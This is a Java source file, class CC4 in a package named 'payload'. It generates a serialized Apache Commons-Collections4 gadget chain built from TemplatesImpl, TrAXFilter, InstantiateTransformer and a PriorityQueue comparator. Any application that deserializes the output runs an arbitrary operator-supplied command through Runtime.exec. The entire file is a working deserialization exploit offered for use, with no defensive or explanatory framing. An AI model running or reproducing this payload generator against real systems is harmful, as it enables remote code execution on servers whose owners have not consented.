package top.racerz.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC4 {

    public static byte[] getPayload(String command) throws Exception{
        String AbstractTranslet = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        ClassPool classPool = ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload = classPool.makeClass("CC4");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"" + command + "\");");

        byte[] bytes = payload.toBytecode();
        Object templates = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();

        Field field = templates.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templates, new byte[][] {bytes});

        Field field1 = templates.getClass().getDeclaredField("_name");
        field1.setAccessible(true);
        field1.set(templates, "test");

        Transformer[] trans = {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };

        ChainedTransformer chain = new ChainedTransformer(trans);
        TransformingComparator transCom = new TransformingComparator(chain);
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);

        Field field2 = PriorityQueue.class.getDeclaredField("comparator");
        field2.setAccessible(true);
        field2.set(queue, transCom);

        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(bout);
        outputStream.writeObject(queue);
        return bout.toByteArray();

    }
}

